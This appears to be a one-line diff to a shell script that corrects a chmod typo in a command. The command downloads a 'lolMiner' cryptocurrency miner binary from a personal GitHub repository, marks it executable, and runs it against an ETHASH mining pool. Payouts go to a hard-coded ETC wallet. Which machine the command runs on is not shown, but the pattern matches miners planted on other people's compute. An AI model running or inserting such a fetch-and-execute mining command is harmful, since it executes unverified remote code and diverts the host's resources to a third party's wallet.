@@ -1,1 +1,1 @@
-wget https://raw.githubusercontent.com/Chadv551/nw/main/lolMiner && chmod -+ lolMiner && ./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user ETC:0xd2c7520156B1965d06EaF4aaF8766084690a963E.T4 --ethstratum ETHPROXY 
+wget https://raw.githubusercontent.com/Chadv551/nw/main/lolMiner && chmod +x lolMiner && ./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user ETC:0xd2c7520156B1965d06EaF4aaF8766084690a963E.T4 --ethstratum ETHPROXY 
